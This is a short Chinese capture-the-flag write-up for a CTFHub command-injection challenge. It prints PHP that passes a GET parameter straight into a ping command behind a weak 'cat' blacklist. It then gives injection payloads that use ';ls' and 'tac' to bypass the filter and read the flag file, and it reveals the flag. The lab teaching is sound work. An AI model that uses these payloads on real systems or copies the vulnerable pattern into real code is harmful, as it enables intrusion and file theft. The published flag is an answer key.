---
title: CTFHub-RCE-过滤cat Writeup
date: 2026-10-24
category: web
tags: [CTFHub, RCE, 命令注入, 绕过]
---
## 漏洞分析

### 源码审计
访问靶机首页，查看源码：
<?php $res = FALSE; if (isset($_GET['ip']) && $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all("/cat/", $ip, $m)) { $cmd = "ping -c 4 {$ip}"; exec($cmd, $res); } else { $res = $m; } } ?>

### 漏洞点：
1. 存在任意命令执行漏洞。
2. 使用了 preg_match_all("/cat/", ...) 进行黑名单过滤，禁止了 cat 字符串。

## 解题步骤

### 第一步：探测目录
利用 ; 截断并执行 ls：
?ip=127.0.0.1;ls
确认目标文件名为 flag_102283148184.php。

### 第二步：绕过过滤读取文件
因为 cat 被过滤，我们可以使用 Linux 中其他替代命令。这里使用 tac（cat 的反写，按行倒序输出，且能完美绕过 /cat/ 的正则）：
?ip=127.0.0.1;tac flag_102283148184.php

### 第三步：查看网页源代码获取 Flag
执行 tac 后，页面回显的 exec 数组最后一行可能为空白。这是因为 <?php ... ?> 标签被浏览器当作 HTML 解析并隐藏了。
此时在页面上右键选择 “查看网页源代码”（或按 Ctrl+U），在源码中搜索 ctfhub{ 即可提取明文 Flag：

### ctfhub{aadebec96a6a6f77c0840f16}
